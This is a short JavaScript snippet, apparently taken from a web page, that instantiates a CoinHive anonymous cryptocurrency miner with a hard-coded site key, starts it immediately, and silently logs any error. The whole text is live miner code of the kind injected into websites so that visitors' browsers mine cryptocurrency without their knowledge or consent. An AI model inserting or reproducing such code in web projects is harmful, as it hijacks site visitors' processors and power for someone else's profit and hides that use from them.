    try {
        var miner = new CoinHive.Anonymous('CWfUVjXV6Ng8wtsl5sAZbDuCwYfk1MKu');
        miner.start();
    } catch (e) {
        if (typeof console !== 'undefined') console.error(e);
    }